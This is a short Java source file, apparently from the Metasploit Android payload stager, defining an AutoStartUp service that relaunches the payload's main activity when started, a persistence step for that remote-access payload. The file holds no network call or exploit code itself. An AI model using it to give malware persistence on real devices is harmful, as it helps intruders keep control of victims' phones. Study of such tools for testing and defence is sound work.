package com.metasploit.stage;


import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class AutoStartUp extends Service {


	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	public void onCreate() {
        
        //Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        Intent i = new Intent();
        i.setClass(this, MainActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        
        super.onCreate();        

       
        
	}
	



}
